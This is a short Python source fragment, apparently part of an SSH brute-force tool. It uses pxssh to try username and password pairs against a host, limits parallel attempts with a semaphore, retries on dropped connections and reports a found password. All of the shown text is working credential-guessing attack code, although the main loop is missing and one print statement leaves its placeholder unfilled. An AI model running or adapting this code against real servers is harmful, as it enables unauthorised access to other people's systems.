from pexpect import pxssh
import argparse
import time
from threading import *

MAXCONNECTIONS = 5
FOUND = False
FAILS = 0

connection_lock = BoundedSemaphore(value=MAXCONNECTIONS)

def connect(host, user, password, release):
    global FOUND
    global FAILS
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password found: '{}'", password)
        FOUND = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            FAILS += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

